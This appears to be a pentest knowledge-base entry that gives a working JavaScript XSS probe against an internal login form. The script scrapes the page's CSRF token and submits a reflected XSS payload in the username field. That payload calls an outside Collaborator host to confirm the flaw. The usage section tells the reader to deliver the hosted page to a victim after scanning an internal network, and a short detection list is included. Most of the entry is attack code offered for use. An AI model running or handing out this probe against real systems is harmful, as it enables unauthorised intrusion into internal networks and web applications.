---
id: d1b2a216-af65-42e3-9efb-894ed541850b
type: code
language: javascript
verified: true
created_at: '2020-08-17T07:52:51.684653+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - XSS
  - probe
  - CORS
platforms:
  - Web
validated: true
---

# JavaScript-XSS-Probe-For-Login-Form

## Code

```javascript
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

## Description

This JavaScript snippet fetches the login page of an internal endpoint, extracts the CSRF token from the HTML, and submits a crafted login form with a reflected XSS payload in the username field. If vulnerable, the payload triggers an image load to the Collaborator URL, confirming the XSS via an out-of-band callback.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ip | Internal IP address of the target endpoint | 192.168.0.50 |
| $collaboratorPayload | Unique subdomain for Burp Collaborator | abc123.oastify.com |

## Usage

Host this in an HTML page and deliver to the victim after discovering an internal IP via network scan. The script automates CSRF token extraction and payload injection. Monitor Collaborator for ?foundXSS=1 callback to verify vulnerability.

## Detection

- Server logs showing login attempts with malformed usernames containing script tags.
- Network traffic with img src to external domains from login endpoints.
- CSP violations or XSS filters triggering on payload execution.

## Related

- [[procedures/CORS-Misconfiguration-Leading-To-Internal-Network-Pivot]]
- [[tools/Burp-Suite]]
